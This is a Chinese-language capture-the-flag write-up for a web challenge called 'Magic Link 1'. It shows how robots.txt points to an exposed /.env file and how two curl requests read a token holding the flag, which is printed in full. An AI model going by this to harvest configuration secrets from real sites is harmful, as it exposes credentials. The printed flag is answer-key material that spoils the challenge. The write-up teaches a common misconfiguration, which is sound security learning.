# Magic Link 1

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：https://bluehens-magic-link.chals.io/
- 核心漏洞：敏感环境配置文件 `/.env` 暴露

## 入口与现象

访问首页可以看到一个很简单的 Magic Link 登录页面，前端会把邮箱提交到 `/login`：

```html
<form id="magic-link-form">
  <input type="email" name="email" placeholder="Enter Email" required>
  <button type="submit">Send Magic Link</button>
</form>
```

提交任意邮箱后，后端会返回一段 JSON：

```json
{
  "datetime": "2026-04-18T09:43:23.207248+00:00",
  "email": "test@example.com",
  "ip-address": "10.1.0.20",
  "message": "Magic link generated, check your email.",
  "uuid": "jREieg2jmswcQ_60yhmw2w"
}
```

这里能看出两件事：

1. 后端是直接返回调试/业务信息的，暴露了内网 IP。
2. 题目名字虽然叫 Magic Link，但入口本身没有真正把邮件内容展示出来，所以先不要急着硬怼 token。

接着看基础枚举，`robots.txt` 很关键：

```text
User-agent: *
Disallow: /inbox
Disallow: /dashboard
Disallow: /.env
```

CTF 里这种把敏感路径直接写进 `robots.txt` 的情况，通常就是明确提示去看这些路径。

## 分析过程

先访问 `/.env`：

```http
GET /.env HTTP/1.1
Host: bluehens-magic-link.chals.io
```

返回内容如下：

```text
TEDDYS_EMAIL=teddy@udctf.com
TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
ADMIN_EMAIL=admin@udctf.com
INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
```

到这里其实已经结束了，flag 直接放在环境变量 `TEDDYS_TOKEN` 里。

顺带还能看出题目设计思路：

- 服务本来是个 magic link 登录系统。
- Teddy 的邮箱和 token 被写进环境变量。
- 开发者把 `/.env` 暴露到了 Web 根目录。
- 于是不用真的走登录流程，直接读配置文件就能拿到 flag。

## 利用过程

1. 打开首页，确认是一个提交邮箱到 `/login` 的 Magic Link 页面。
2. 查看 `robots.txt`，发现它明确列出了 `/.env`。
3. 直接请求 `/.env`。
4. 在返回内容中读取 `TEDDYS_TOKEN`，得到 flag。

## 关键 payload / 命令

```bash
curl -i https://bluehens-magic-link.chals.io/robots.txt
curl -i https://bluehens-magic-link.chals.io/.env
```

关键响应：

```text
TEDDYS_EMAIL=teddy@udctf.com
TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
ADMIN_EMAIL=admin@udctf.com
INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
```

## Flag

```text
udctf{d0n7_h057_y0ur_3nv_f113}
```

## 总结

这题是很典型的敏感文件泄露。表面上给了一个 Magic Link 登录页，但真正的突破口在 `robots.txt` 暗示的 `/.env`。只要有访问配置文件的习惯，这题基本就是秒出。
